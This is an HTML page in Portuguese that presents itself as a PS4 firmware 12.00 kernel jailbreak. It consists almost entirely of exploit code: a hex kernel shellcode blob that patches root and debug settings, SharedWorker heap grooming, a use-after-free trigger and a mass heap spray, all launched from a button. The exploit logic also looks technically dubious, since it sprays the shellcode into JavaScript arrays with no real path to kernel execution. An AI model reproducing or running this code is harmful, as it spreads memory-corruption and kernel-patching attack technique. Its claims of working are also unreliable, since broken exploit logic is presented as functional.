<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 Jailbreak (Blind Kernel Trigger)</title>
    
</head>
<body>

    <h1>PS4 12.00 Kernel Exploit</h1>
    <h3>Método: SharedWorker UAF (Blind Spray 400-404)</h3>
    <div id="status">Status: Pronto para iniciar</div>
    <div id="log"></div>
    <br>
    <button onclick="start_exploit()">INICIAR JAILBREAK</button>

    <script>
        // =================================================================
        // 1. CONFIGURAÇÃO E PAYLOAD (12.00)
        // =================================================================
        
        // Shellcode extraído do KernelOffset.java (Gezine) para FW 12.00
        // Contém os patches de Root, RWX e Debug Settings.
        var shellcode_hex = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";

        function log(msg, cls="") {
            var d = document.getElementById("log");
            var line = document.createElement("div");
            line.className = cls;
            line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            d.appendChild(line);
            d.scrollTop = d.scrollHeight;
        }

        // Converte a string HEX do Java para Bytes reais
        function get_payload_bytes() {
            var len = shellcode_hex.length / 2;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = parseInt(shellcode_hex.substr(i*2, 2), 16);
            }
            return bytes;
        }

        // =================================================================
        // 2. CONSTRUÇÃO DO SPRAY (OBJETO FALSO)
        // =================================================================
        function build_spray_payload() {
            var payload_bytes = get_payload_bytes();
            
            // Tamanho alvo: 0x400 (1024 bytes) - Baseado nos seus testes de crash
            var target_size = 0x400; 
            var buffer = new Uint32Array(target_size / 4);

            // Preencher com "NOP Sled" seguro (0x90909090 seria ideal, mas em JS usamos Ints)
            // Usamos um padrão repetitivo para debugging se der crash
            buffer.fill(0x41414141); 

            // Inserir o Shellcode dentro do objeto (Offset +32 bytes para segurança)
            // Estamos colocando o código executável dentro do próprio objeto que vai substituir o Worker
            var start_idx = 8; // Começa no index 8 (32 bytes)
            
            for (var i = 0; i < payload_bytes.length; i+=4) {
                // Monta 4 bytes em 1 Uint32 (Little Endian)
                var val = payload_bytes[i] | (payload_bytes[i+1] << 8) | (payload_bytes[i+2] << 16) | (payload_bytes[i+3] << 24);
                if (start_idx + (i/4) < buffer.length) {
                    buffer[start_idx + (i/4)] = val;
                }
            }

            return buffer;
        }

        // =================================================================
        // 3. LÓGICA DO EXPLOIT (400 -> 404)
        // =================================================================
        var workers_stash = [];

        async function start_exploit() {
            if (!window.SharedWorker) {
                log("ERRO: Navegador não suporta SharedWorker.", "err");
                return;
            }

            log("Preparando Payload (12.00 Shellcode)...");
            var fake_obj = build_spray_payload();

            log("Fase 1: Grooming (Estabilizando Heap 0-400)...");
            // Criar base sólida para evitar fragmentação
            for(let i=0; i < 400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "groom_" + i);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e) {}
            }
            log("Heap base estabilizada.", "success");

            // Entrar na Zona de Pressão
            log("Fase 2: Aplicando Pressão (401-404)...", "warn");
            
            var p_count = 0;
            var interval = setInterval(() => {
                // Chegamos no limite (404)
                if (p_count >= 4) {
                    clearInterval(interval);
                    trigger_uaf(fake_obj); // DISPARAR
                    return;
                }

                // Cria workers lentamente
                try {
                    let id = 401 + p_count;
                    let w = new SharedWorker("data:text/javascript,1", "victim_" + id);
                    w.port.start();
                    workers_stash.push(w);
                    log(`Worker ${id} alocado.`);
                } catch(e) {
                    log("Erro na alocação: " + e, "err");
                }
                
                p_count++;
            }, 150); // Delay de 150ms para garantir que o Kernel processe
        }

        function trigger_uaf(payload) {
            log("!!! DISPARANDO SWAP NO WORKER 404 !!!", "err");
            document.getElementById("status").innerText = "Status: EXECUTANDO EXPLOIT...";
            
            // 1. Pegar a vítima (Worker 404)
            var victim = workers_stash.pop();

            // 2. FREE (Libera a memória)
            victim.port.close();
            victim = null;

            // 3. SPRAY (Reclaim Imediato)
            // Tenta preencher o buraco com milhares de cópias do nosso objeto falso
            log("Realizando Spray Massivo...");
            
            var spray_copies = [];
            // Aumentei para 10.000 para garantir que o buraco seja preenchido
            // Isso deve consumir uns 40MB de RAM, o que é seguro
            for (var i = 0; i < 10000; i++) {
                spray_copies.push(new Uint32Array(payload));
            }

            log("Spray concluído. Aguardando Kernel...", "warn");
            
            // Se o console não desligar em 5 segundos, temos esperança
            setTimeout(() => {
                log("Verificação pós-exploit: O console ainda está ligado?", "success");
                log("Se sim, tente abrir as Configurações -> Debug Settings.");
                alert("Processo concluído! Verifique se tem Debug Settings.");
            }, 5000);
        }

    </script>
</body>
</html>
